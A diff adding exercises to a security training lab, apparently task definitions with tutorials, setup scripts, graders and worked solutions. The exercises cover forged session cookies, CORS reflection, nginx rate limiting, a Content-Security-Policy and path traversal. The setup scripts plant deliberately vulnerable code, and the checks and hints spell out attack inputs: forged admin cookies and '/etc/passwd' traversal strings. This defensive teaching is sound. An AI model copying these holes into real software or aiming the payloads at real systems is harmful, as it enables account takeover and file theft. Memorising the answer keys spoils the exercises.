+    ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20';
+    ssl_prefer_server_ciphers on;
+    ```
+    ```bash
+    docker exec kl-web nginx -s reload
+    for c in AES256-SHA ECDHE-RSA-AES128-GCM-SHA256; do
+      openssl s_client -connect 127.0.0.1:8443 -tls1_2 -cipher $c </dev/null 2>&1 | grep 'Cipher is'
+    done
+    ```
+  setup: |
+    rm -rf /lab/nginx
+    mkdir -p /lab/nginx/html /lab/nginx/tls
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    echo "$tok" > "$KL_STATE/tok"
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out /lab/nginx/tls/web.crt \
+      -days 365 -subj "/CN=web.lab.test" -addext "subjectAltName=DNS:web.lab.test" 2>/dev/null
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+
+        # "maximum compatibility" (2014)
+        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
+        ssl_ciphers 'ALL:!aNULL:@SECLEVEL=0';
+        ssl_prefer_server_ciphers on;
+    }
+    EOF
+    printf '<h1>Acme</h1>\n<p>%s</p>\n' "$tok" > /lab/nginx/html/index.html
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -p 127.0.0.1:8443:443 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok")
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    tls() { timeout 5 openssl s_client -connect 127.0.0.1:8443 -servername web.lab.test "$@" </dev/null 2>&1 | grep -q 'Cipher is [A-Z]'; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check_not "TLS 1.0 is refused" 'tls -tls1 -cipher "DEFAULT:@SECLEVEL=0"'
+    check_not "TLS 1.1 is refused" 'tls -tls1_1 -cipher "DEFAULT:@SECLEVEL=0"'
+    for c in AES128-GCM-SHA256 AES256-SHA ECDHE-RSA-AES128-SHA ECDHE-RSA-AES256-SHA384; do
+      check_not "TLS 1.2 refuses $c" "tls -tls1_2 -cipher $c"
+    done
+    for c in ECDHE-RSA-AES128-GCM-SHA256 ECDHE-RSA-AES256-GCM-SHA384 ECDHE-RSA-CHACHA20-POLY1305; do
+      check "TLS 1.2 accepts $c" "tls -tls1_2 -cipher $c"
+    done
+    check "TLS 1.3 works" 'tls -tls1_3'
+    check "the site is still served over HTTPS" 'curl -fsk -m 5 https://127.0.0.1:8443/ | grep -qF "$tok"'
+  solve: |
+    sed -i -e 's/^\( *\)ssl_protocols .*/\1ssl_protocols TLSv1.2 TLSv1.3;/' \
+           -e "s/^\( *\)ssl_ciphers .*/\1ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20';/" \
+           -e '/maximum compatibility/d' /lab/nginx/default.conf
+    docker exec kl-web nginx -s reload
+
+- id: sec-081
+  title: The session cookie anyone can forge
+  difficulty: 3
+  kind: fix
+  tags: [web, sessions, cookies, python, authentication]
+  tutorial: |
+    **Concept.** A session cookie should be an **unguessable random token**
+    that the server maps to a user. If it is derived from the user itself
+    (base64 of the username, a sequential id), anyone can mint one for any
+    account. The cookie's attributes matter too: **`HttpOnly`** keeps
+    JavaScript (and so XSS) from reading it, **`Secure`** keeps it off plain
+    HTTP, and **`SameSite`** stops other sites riding on it (CSRF).
+
+    **Read up on:**
+    - Python `secrets.token_urlsafe`
+    - `Set-Cookie` attributes: `HttpOnly`, `Secure`, `SameSite=Strict|Lax`
+    - OWASP Session Management Cheat Sheet
+  scenario: |
+    **`/lab/app.py`** is a small portal (Python standard library only; try it
+    with `PORT=8000 python3 /lab/app.py`). `POST /login` with form fields
+    `user` and `password` sets a `session` cookie; `GET /me` says who you
+    are; `GET /admin` is for the `admin` user only. A tester logged in as
+    `alice` (password `wonderland`) and was admin a minute later. Fix the app:
+
+    - the `session` cookie value must be a **random token** of at least 16
+      random bytes (22 or more characters), different on every login, that
+      the server maps to the user; a cookie built from a username (e.g. the
+      base64 of `admin` or `alice`) must not log anyone in
+    - the cookie must carry **`HttpOnly`**, **`Secure`** and
+      **`SameSite=Strict`** (or `Lax`); the app sits behind a TLS proxy
+    - logging in as alice and using that cookie on `/me` still says `alice`
+
+    Keep the routes, the field names and the cookie name. The check runs your
+    `/lab/app.py` in a fresh `python:3.12-alpine` container.
+  hints:
+    - "`curl -si -d user=alice -d password=wonderland http://127.0.0.1:8000/login` shows the cookie. Then `echo VALUE | base64 -d`."
+    - "Keep a dict `SESSIONS = {}`; on login `token = secrets.token_urlsafe(32)`, `SESSIONS[token] = user`; when reading the cookie, `return SESSIONS.get(value)`."
+    - "The header: `session=TOKEN; Path=/; HttpOnly; Secure; SameSite=Strict`. curl still shows it over plain HTTP; browsers just won't send it back there."
+  solution: |
+    ```python
+    import secrets
+    SESSIONS = {}
+
+    def user(self):                      # in the handler
+        for part in self.headers.get("Cookie", "").split(";"):
+            k, _, v = part.strip().partition("=")
+            if k == "session" and v:
+                return SESSIONS.get(v)
+        return None
+
+    # in do_POST, after the password check:
+    token = secrets.token_urlsafe(32)
+    SESSIONS[token] = u
+    self.send(200, "welcome %s\n" % u,
+              [("Set-Cookie", "session=%s; Path=/; HttpOnly; Secure; SameSite=Strict" % token)])
+    ```
+    Then drop `import base64`; nothing decodes the cookie any more.
+  setup: |
+    rm -f /lab/app.py
+    lab_file /lab/app.py <<'PY'
+    import base64, os
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    from urllib.parse import parse_qs
+
+    USERS = {"alice": "wonderland",
+             "admin": os.environ.get("ADMIN_PASSWORD") or os.urandom(16).hex()}
+
+
+    class H(BaseHTTPRequestHandler):
+        def send(self, code, body, headers=()):
+            data = body.encode()
+            self.send_response(code)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
+            for k, v in headers:
+                self.send_header(k, v)
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+
+        def user(self):
+            for part in self.headers.get("Cookie", "").split(";"):
+                k, _, v = part.strip().partition("=")
+                if k == "session" and v:
+                    try:
+                        return base64.b64decode(v).decode()
+                    except Exception:
+                        return None
+            return None
+
+        def do_GET(self):
+            if self.path == "/":
+                self.send(200, "Acme portal. POST user= and password= to /login.\n")
+            elif self.path == "/me":
+                u = self.user()
+                if u:
+                    self.send(200, "logged in as %s\n" % u)
+                else:
+                    self.send(401, "not logged in\n")
+            elif self.path == "/admin":
+                if self.user() == "admin":
+                    self.send(200, "admin panel\n")
+                else:
+                    self.send(403, "forbidden\n")
+            else:
+                self.send(404, "not found\n")
+
+        def do_POST(self):
+            if self.path != "/login":
+                return self.send(404, "not found\n")
+            n = int(self.headers.get("Content-Length") or 0)
+            form = parse_qs(self.rfile.read(n).decode())
+            u = form.get("user", [""])[0]
+            p = form.get("password", [""])[0]
+            if not p or USERS.get(u) != p:
+                return self.send(401, "bad credentials\n")
+            token = base64.b64encode(u.encode()).decode()
+            self.send(200, "welcome %s\n" % u, [("Set-Cookie", "session=%s; Path=/" % token)])
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+  check: |
+    B=http://127.0.0.1:8090
+    docker rm -f kl-chk >/dev/null 2>&1
+    docker run -d --name kl-chk -p 127.0.0.1:8090:8000 -e PORT=8000 -v /lab/app.py:/app/app.py:ro \
+      python:3.12-alpine python /app/app.py >/dev/null 2>&1
+    check "your app.py starts" 'eventually 15 "curl -s -o /dev/null -m 2 $B/"'
+    login() { curl -s -m 5 -D - -o /dev/null -d user=alice -d password=wonderland "$B/login" | tr -d '\r' | grep -i '^set-cookie: *session=' | head -1; }
+    sc1=$(login); sc2=$(login)
+    t1=$(sed -E 's/^[^:]*: *session=([^;]*).*/\1/' <<<"$sc1")
+    t2=$(sed -E 's/^[^:]*: *session=([^;]*).*/\1/' <<<"$sc2")
+    check "logging in sets a session cookie" '[ -n "$t1" ]'
+    check "the cookie is HttpOnly" 'grep -qiE ";[[:space:]]*httponly([[:space:]]*;|[[:space:]]*$)" <<<"$sc1"'
+    check "the cookie is Secure" 'grep -qiE ";[[:space:]]*secure([[:space:]]*;|[[:space:]]*$)" <<<"$sc1"'
+    check "the cookie has SameSite=Strict or Lax" 'grep -qiE ";[[:space:]]*samesite=(strict|lax)" <<<"$sc1"'
+    check "the token is long (22+ characters)" '[ "${#t1}" -ge 22 ]'
+    check "every login gets a different token" '[ -n "$t2" ] && [ "$t1" != "$t2" ]'
+    check "alice's real session works on /me" 'curl -s -m 5 -b "session=$t1" $B/me | grep -q alice'
+    fa=$(printf admin | base64); fl=$(printf alice | base64)
+    check_not "a forged admin cookie doesn't open /admin" 'curl -s -m 5 -b "session=$fa" $B/admin | grep -q "admin panel"'
+    check_not "a forged alice cookie isn't logged in" 'curl -s -m 5 -b "session=$fl" $B/me | grep -q alice'
+    docker rm -f kl-chk >/dev/null 2>&1
+  solve: |
+    cat > /lab/app.py <<'PY'
+    import os, secrets
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    from urllib.parse import parse_qs
+
+    SESSIONS = {}
+    USERS = {"alice": "wonderland",
+             "admin": os.environ.get("ADMIN_PASSWORD") or os.urandom(16).hex()}
+
+
+    class H(BaseHTTPRequestHandler):
+        def send(self, code, body, headers=()):
+            data = body.encode()
+            self.send_response(code)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
+            for k, v in headers:
+                self.send_header(k, v)
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+
+        def user(self):
+            for part in self.headers.get("Cookie", "").split(";"):
+                k, _, v = part.strip().partition("=")
+                if k == "session" and v:
+                    return SESSIONS.get(v)
+            return None
+
+        def do_GET(self):
+            if self.path == "/":
+                self.send(200, "Acme portal. POST user= and password= to /login.\n")
+            elif self.path == "/me":
+                u = self.user()
+                if u:
+                    self.send(200, "logged in as %s\n" % u)
+                else:
+                    self.send(401, "not logged in\n")
+            elif self.path == "/admin":
+                if self.user() == "admin":
+                    self.send(200, "admin panel\n")
+                else:
+                    self.send(403, "forbidden\n")
+            else:
+                self.send(404, "not found\n")
+
+        def do_POST(self):
+            if self.path != "/login":
+                return self.send(404, "not found\n")
+            n = int(self.headers.get("Content-Length") or 0)
+            form = parse_qs(self.rfile.read(n).decode())
+            u = form.get("user", [""])[0]
+            p = form.get("password", [""])[0]
+            if not p or USERS.get(u) != p:
+                return self.send(401, "bad credentials\n")
+            token = secrets.token_urlsafe(32)
+            SESSIONS[token] = u
+            self.send(200, "welcome %s\n" % u,
+                      [("Set-Cookie", "session=%s; Path=/; HttpOnly; Secure; SameSite=Strict" % token)])
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+
+- id: sec-082
+  title: Slow down the password guessers
+  difficulty: 3
+  kind: build
+  tags: [nginx, rate-limit, brute-force, web]
+  tutorial: |
+    **Concept.** A login form that answers as fast as it is asked is an
+    invitation to guess passwords. nginx's **`limit_req`** puts a leaky
+    bucket in front of a location: `limit_req_zone` defines the key (usually
+    the client address) and the rate; `limit_req` applies it, with a `burst`
+    of requests tolerated on top. With `nodelay` the burst is served at once
+    and everything beyond it is rejected immediately, with the status set by
+    `limit_req_status` (503 unless you say otherwise; 429 is the honest one).
+    Limits apply per location, so the rest of the site stays fast.
+
+    **Read up on:**
+    - nginx `limit_req_zone`, `limit_req` (`burst`, `nodelay`), `limit_req_status`
+    - Why `limit_req_zone` must sit at `http` level (outside `server`)
+    - HTTP 429 Too Many Requests
+  scenario: |
+    **`kl-web`** (`http://127.0.0.1:8080/`, configuration
+    **`/lab/nginx/default.conf`**, mounted at `/etc/nginx/conf.d` and
+    included inside nginx's `http` block) serves a login page at
+    **`/login/`** that bots are hammering. Add a rate limit:
+
+    - a zone named **`login`**, keyed on the client address, at **1 request
+      per second**
+    - applied to **`/login/`** only, with **`burst=5`** and **`nodelay`**
+    - rejected requests get **429**
+
+    The check restarts `kl-web`, then sends 20 back-to-back requests to
+    `/login/`: the first 5 must succeed (200) and at least 10 must get 429.
+    20 back-to-back requests to `/` must all get 200.
+  hints:
+    - "`limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;` goes at the top of default.conf, outside the `server` block."
+    - "In `location /login/`: `limit_req zone=login burst=5 nodelay;` and `limit_req_status 429;`."
+    - "Test: `for i in $(seq 20); do curl -s -o /dev/null -w '%{http_code} ' http://127.0.0.1:8080/login/; done`."
+  solution: |
+    ```nginx
+    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
+
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /login/ {
+            limit_req zone=login burst=5 nodelay;
+            limit_req_status 429;
+            try_files $uri $uri/ =404;
+        }
+    }
+    ```
+  setup: |
+    rm -rf /lab/nginx
+    mkdir -p /lab/nginx/html/login
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /login/ {
+            try_files $uri $uri/ =404;
+        }
+    }
+    EOF
+    printf '<h1>Acme</h1>\n' > /lab/nginx/html/index.html
+    printf '<form method="post"><input name="user"><input name="password" type="password"></form>\n' > /lab/nginx/html/login/index.html
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    burst() { local i; for i in $(seq 20); do curl -s -o /dev/null -m 3 -w '%{http_code}\n' "http://127.0.0.1:8080$1"; done; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    codes=$(burst /login/)
+    n429=$(grep -c '^429$' <<<"$codes")
+    check_eq "the first 5 requests to /login/ succeed" "$(head -5 <<<"$codes" | sort -u | tr '\n' ' ')" "200 "
+    check "at least 10 of 20 requests to /login/ get 429 (got $n429)" '[ "$n429" -ge 10 ]'
+    check_eq "nothing but 200 and 429 from /login/" "$(grep -vcE '^(200|429)$' <<<"$codes")" 0
+    check_eq "/ is not limited" "$(burst / | sort -u | tr '\n' ' ')" "200 "
+  solve: |
+    cat > /lab/nginx/default.conf <<'EOF'
+    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
+
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /login/ {
+            limit_req zone=login burst=5 nodelay;
+            limit_req_status 429;
+            try_files $uri $uri/ =404;
+        }
+    }
+    EOF
+    docker exec kl-web nginx -s reload
+
+- id: sec-083
+  title: The API that shares with every origin
+  difficulty: 3
+  kind: fix
+  tags: [web, cors, python, api]
+  tutorial: |
+    **Concept.** Browsers stop a page on one origin from reading responses
+    from another, unless the server opts in with **CORS** headers. Echoing
+    whatever `Origin` the request carries back in
+    `Access-Control-Allow-Origin`, together with
+    `Access-Control-Allow-Credentials: true`, opts in for **every** site:
+    any page the victim visits can read their data with their cookies. The
+    fix is an **exact allowlist** of origins (scheme, host and port). Prefix
+    or suffix matching is a bug of its own (`app.lab.test.evil.test`). And
+    because the answer now depends on `Origin`, responses must say
+    **`Vary: Origin`** so caches don't serve one origin's answer to another.
+
+    **Read up on:**
+    - `Access-Control-Allow-Origin`, `-Allow-Credentials`, preflight `OPTIONS`
+    - Why `*` can't be combined with credentials, and why reflection is worse
+    - `Vary: Origin`
+  scenario: |
+    **`/lab/app.py`** (Python standard library; try it with
+    `PORT=8000 python3 /lab/app.py`) serves **`GET /api/account`**, which
+    returns the user's API key, and answers CORS preflights (`OPTIONS`). It
+    reflects any `Origin`. Fix it so that:
+
+    - only the origins **`https://app.lab.test`** and **`https://admin.lab.test`**
+      get CORS access: for them, both `GET` and `OPTIONS` answer with
+      `Access-Control-Allow-Origin` equal to that origin and
+      `Access-Control-Allow-Credentials: true`
+    - for **any other** `Origin` (`https://evil.test`,
+      `https://app.lab.test.evil.test`, `http://app.lab.test`, `null`, ...)
+      there is **no** `Access-Control-Allow-Origin` header at all
+    - `/api/account` responses carry **`Vary: Origin`**
+    - `/api/account` without an `Origin` still returns the JSON
+
+    The check runs your `/lab/app.py` in a fresh `python:3.12-alpine`
+    container.
+  hints:
+    - "`curl -si -H 'Origin: https://evil.test' http://127.0.0.1:8000/api/account` shows the problem."
+    - "Compare the header to a set, exactly: `ALLOWED = {\"https://app.lab.test\", \"https://admin.lab.test\"}` and `if origin in ALLOWED:`. No `startswith`, `endswith` or `in` on strings."
+    - "Send `Vary: Origin` unconditionally from the same helper that sends the CORS headers."
+  solution: |
+    ```python
+    ALLOWED = {"https://app.lab.test", "https://admin.lab.test"}
+
+    def cors(self):
+        self.send_header("Vary", "Origin")
+        origin = self.headers.get("Origin")
+        if origin in ALLOWED:
+            self.send_header("Access-Control-Allow-Origin", origin)
+            self.send_header("Access-Control-Allow-Credentials", "true")
+    ```
+  setup: |
+    rm -f /lab/app.py
+    lab_file /lab/app.py <<'PY'
+    import json, os
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+    ACCOUNT = {"user": "alice", "api_key": "ak_live_" + os.urandom(12).hex()}
+
+
+    class H(BaseHTTPRequestHandler):
+        def cors(self):
+            origin = self.headers.get("Origin")
+            if origin:
+                self.send_header("Access-Control-Allow-Origin", origin)
+                self.send_header("Access-Control-Allow-Credentials", "true")
+
+        def do_OPTIONS(self):
+            self.send_response(204)
+            self.cors()
+            self.send_header("Access-Control-Allow-Methods", "GET")
+            self.send_header("Access-Control-Allow-Headers", "Content-Type")
+            self.end_headers()
+
+        def do_GET(self):
+            if self.path != "/api/account":
+                self.send_response(404)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            body = json.dumps(ACCOUNT).encode()
+            self.send_response(200)
+            self.cors()
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+  check: |
+    B=http://127.0.0.1:8090
+    docker rm -f kl-chk >/dev/null 2>&1
+    docker run -d --name kl-chk -p 127.0.0.1:8090:8000 -e PORT=8000 -v /lab/app.py:/app/app.py:ro \
+      python:3.12-alpine python /app/app.py >/dev/null 2>&1
+    check "your app.py starts" 'eventually 15 "curl -s -o /dev/null -m 2 $B/"'
+    # hv METHOD ORIGIN HEADER -> value of HEADER in the response to /api/account
+    hv() { curl -s -m 5 -X "$1" -D - -o /dev/null -H "Origin: $2" "$B/api/account" | tr -d '\r' | grep -i "^$3:" | head -1 | cut -d: -f2- | sed 's/^ *//'; }
+    for o in https://evil.test https://app.lab.test.evil.test http://app.lab.test null https://admin.lab.test:8443; do
+      check_eq "GET from $o gets no Allow-Origin" "$(hv GET "$o" Access-Control-Allow-Origin)" ""
+      check_eq "OPTIONS from $o gets no Allow-Origin" "$(hv OPTIONS "$o" Access-Control-Allow-Origin)" ""
+    done
+    for o in https://app.lab.test https://admin.lab.test; do
+      check_eq "GET from $o is allowed with credentials" "$(hv GET "$o" Access-Control-Allow-Origin) $(hv GET "$o" Access-Control-Allow-Credentials)" "$o true"
+      check_eq "OPTIONS from $o is allowed" "$(hv OPTIONS "$o" Access-Control-Allow-Origin)" "$o"
+    done
+    check "responses vary on Origin" 'hv GET https://app.lab.test Vary | grep -qi origin && hv GET https://evil.test Vary | grep -qi origin'
+    check "/api/account still returns the account" 'curl -fs -m 5 $B/api/account | grep -q api_key'
+    docker rm -f kl-chk >/dev/null 2>&1
+  solve: |
+    python3 - <<'PY'
+    p = "/lab/app.py"
+    s = open(p).read()
+    s = s.replace('''    def cors(self):
+            origin = self.headers.get("Origin")
+            if origin:''', '''    def cors(self):
+            self.send_header("Vary", "Origin")
+            origin = self.headers.get("Origin")
+            if origin in ALLOWED:''')
+    if "ALLOWED = " not in s:
+        s = s.replace("ACCOUNT = {", 'ALLOWED = {"https://app.lab.test", "https://admin.lab.test"}\nACCOUNT = {', 1)
+    open(p, "w").write(s)
+    PY
+
+- id: sec-084
+  title: A content security policy that allows one script
+  difficulty: 4
+  kind: build
+  tags: [web, csp, nginx, xss, security-headers]
+  tutorial: |
+    **Concept.** A **Content-Security-Policy** tells the browser where
+    scripts, styles, frames and plugins may come from, so an injected
+    `<script>` doesn't run even when the XSS bug is there. Allowing inline
+    code with `'unsafe-inline'` throws most of that away. Instead, a policy
+    can allow one specific inline script by the **base64 SHA-256 of its exact
+    text** (`'sha256-...'`). Changing a single character of the script then
+    blocks it. A strong policy also sets `object-src 'none'`, `base-uri` (so
+    an injected `<base>` can't redirect relative script URLs) and
+    `frame-ancestors` (clickjacking).
+
+    **Read up on:**
+    - CSP directives: `default-src`, `script-src`, `object-src`, `base-uri`, `frame-ancestors`
+    - Hash sources and how the hash is computed (the text between the tags, byte for byte)
+    - `openssl dgst -sha256 -binary | base64`
+  scenario: |
+    **`kl-web`** (`http://127.0.0.1:8080/`, configuration
+    **`/lab/nginx/default.conf`**, site in **`/lab/nginx/html`**) serves a
+    status page with one **inline** `<script>` and one external script
+    `/app.js`. Add a `Content-Security-Policy` header to the responses for
+    `/` and `/app.js` with exactly these directives:
+
+    - `default-src 'self'`
+    - `script-src` that allows `'self'` and the inline script by its
+      `'sha256-...'` hash, and nothing broader: no `'unsafe-inline'`,
+      `'unsafe-eval'`, `*`, `data:`, `http:` or `https:`
+    - `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`
+
+    Don't change `index.html`. The check restarts `kl-web` with your
+    configuration.
+  hints:
+    - "The hash covers only the text between `<script>` and `</script>`: `grep -o '<script>[^<]*</script>' /lab/nginx/html/index.html | sed -e 's/^<script>//' -e 's#</script>$##' | tr -d '\\n' | openssl dgst -sha256 -binary | base64`."
+    - "One header, directives separated by `;`, inside double quotes in nginx: `add_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'sha256-...'; ...\" always;`."
+    - "Read it back with `curl -sI http://127.0.0.1:8080/ | grep -i content-security`. Browsers' developer consoles print the hash a blocked inline script would need, which is a handy cross-check."
+  solution: |
+    ```bash
+    h=$(grep -o '<script>[^<]*</script>' /lab/nginx/html/index.html \
+        | sed -e 's/^<script>//' -e 's#</script>$##' | tr -d '\n' \
+        | openssl dgst -sha256 -binary | base64)
+    echo "$h"
+    ```
+    ```nginx
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'sha256-<h>'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" always;
+    }
+    ```
+  setup: |
+    rm -rf /lab/nginx
+    mkdir -p /lab/nginx/html
+    b=$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+    }
+    EOF
+    cat > /lab/nginx/html/index.html <<EOF
+    <!doctype html>
+    <html><head><title>Acme status</title></head>
+    <body>
+    <h1>Status</h1><p>Build <span id="v"></span></p>
+    <script>document.getElementById("v").textContent="build-$b";</script>
+    <script src="/app.js"></script>
+    </body></html>
+    EOF
+    printf 'console.log("status page loaded");\n' > /lab/nginx/html/app.js
+    printf '%s' "document.getElementById(\"v\").textContent=\"build-$b\";" | openssl dgst -sha256 -binary | base64 > "$KL_STATE/hash"
+    sha256sum /lab/nginx/html/index.html | cut -d' ' -f1 > "$KL_STATE/index"
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    want="'sha256-$(cat "$KL_STATE/hash")'" self="'self'"
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    csp_of() { curl -s -m 5 -D - -o /dev/null "http://127.0.0.1:8080$1" | tr -d '\r' | grep -i '^content-security-policy:' | head -1 | cut -d: -f2-; }
+    # directive NAME -> its sources, space-separated, from $csp
+    directive() { tr ';' '\n' <<<"$csp" | awk -v d="$1" '$1 == d { $1 = ""; sub(/^ +/, ""); print; exit }'; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check_eq "index.html is unchanged" "$(sha256sum /lab/nginx/html/index.html 2>/dev/null | cut -d' ' -f1)" "$(cat "$KL_STATE/index")"
+    for p in / /app.js; do
+      csp=$(csp_of "$p")
+      check "$p has a Content-Security-Policy header" '[ -n "$csp" ]'
+      check_eq "$p default-src" "$(directive default-src)" "'self'"
+      ss=" $(directive script-src) "
+      check "$p script-src allows 'self'" '[[ "$ss" == *" $self "* ]]'
+      check "$p script-src allows the inline script by its hash" '[[ "$ss" == *" $want "* ]]'
+      check_not "$p script-src allows nothing broader" 'grep -qiE "unsafe-inline|unsafe-eval|unsafe-hashes|data:|https?:| \* " <<<"$ss"'
+      check_eq "$p object-src" "$(directive object-src)" "'none'"
+      check_eq "$p base-uri" "$(directive base-uri)" "'none'"
+      check_eq "$p frame-ancestors" "$(directive frame-ancestors)" "'none'"
+    done
+  solve: |
+    h=$(grep -o '<script>[^<]*</script>' /lab/nginx/html/index.html \
+        | sed -e 's/^<script>//' -e 's#</script>$##' | tr -d '\n' \
+        | openssl dgst -sha256 -binary | base64)
+    cat > /lab/nginx/default.conf <<EOF
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'sha256-$h'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" always;
+    }
+    EOF
+    docker exec kl-web nginx -s reload
+
+- id: sec-085
+  title: The download link that reads any file
+  difficulty: 4
+  kind: fix
+  tags: [web, path-traversal, python, input-validation]
+  tutorial: |
+    **Concept.** A download handler that joins a user-supplied name onto a
+    directory is a **path traversal** waiting to happen. Blocklists don't fix
+    it. Strip `../` once and `....//` turns back into `../`. Decode after
+    filtering and `%252e%252e%252f` arrives as `../`. And Python's
+    `os.path.join` throws the directory away entirely when the name is
+    absolute (`/etc/passwd`). The robust fix doesn't inspect the string at
+    all: **resolve** the final path (`os.path.realpath`, which also follows
+    symlinks) and serve it only if it is still **inside** the base directory.
+
+    **Read up on:**
+    - OWASP Path Traversal
+    - `os.path.realpath`, `os.path.commonpath`, `os.path.join` with absolute parts
+    - Why filtering before decoding (or decoding twice) is a bug
+  scenario: |
+    **`/lab/app.py`** (Python standard library; try it with
+    `PORT=8000 python3 /lab/app.py`) serves files from the `files/`
+    directory next to it: `GET /download?name=report.txt`. Its `../` filter
+    is easy to get around. Fix the app so that:
+
+    - every name that resolves **outside** `files/` is refused with a **4xx**
+      status and none of the file's content. The check tries absolute paths
+      (`/etc/passwd`), `....//` tricks and double-encoded `%252e%252e%252f`
+      sequences, aimed at `/etc/passwd` and at a secret file in the
+      directory **above** `files/`
+    - every real file **inside** `files/` is still served (200 with its
+      content), including **`sub/readme.txt`** and **`notes..v2.txt`**
+
+    The check runs your `/lab/app.py` in a fresh `python:3.12-alpine`
+    container as `/app/app.py`, with `/lab/files` as `/app/files`, and puts the
+    secret at `/app/secret.txt`.
+  hints:
+    - "Try `curl 'http://127.0.0.1:8000/download?name=/etc/passwd'` and `curl 'http://127.0.0.1:8000/download?name=....//app.py'`."
+    - "Don't repair the blocklist. Build `path = os.path.realpath(os.path.join(root, name))` where `root = os.path.realpath(FILES)`, and refuse unless `os.path.commonpath([root, path]) == root`."
+    - "`parse_qs` has already decoded the query once; the extra `unquote` is what lets `%252e` through. Drop it, and the `replace` too. Refuse directories and missing files with a 404."
+  solution: |
+    ```python
+    def do_GET(self):
+        url = urlsplit(self.path)
+        if url.path == "/":
+            return self.reply(200, b"Acme downloads: /download?name=report.txt\n")
+        if url.path != "/download":
+            return self.reply(404, b"not found\n")
+        name = parse_qs(url.query).get("name", [""])[0]
+        root = os.path.realpath(FILES)
